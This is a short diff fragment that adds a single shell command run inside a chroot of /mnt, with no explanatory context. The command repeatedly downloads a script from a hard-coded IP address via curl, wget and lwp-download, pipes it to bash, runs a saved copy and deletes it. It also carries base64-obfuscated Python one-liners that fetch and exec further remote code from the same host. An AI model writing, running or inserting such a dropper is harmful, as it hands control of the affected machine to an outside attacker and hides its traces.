@@ -1,0 +1,15 @@
+chroot /mnt /bin/sh -c 'curl -s http://205.185.116.78/xms |
+
+bash -sh; wget -q -O - http://205.185.116.78/xms | bash -sh;
+
+echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc= | base64 -d
+
+| bash -;
+
+ lwp-download http://205.185.116.78/xms /tmp/xms;
+
+ bash /tmp/xms;
+
+ rm -rf /tmp/xms;
+
+ echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9lZS5weSIpLnJlYWQoKSkn | base64 -d | bash -'
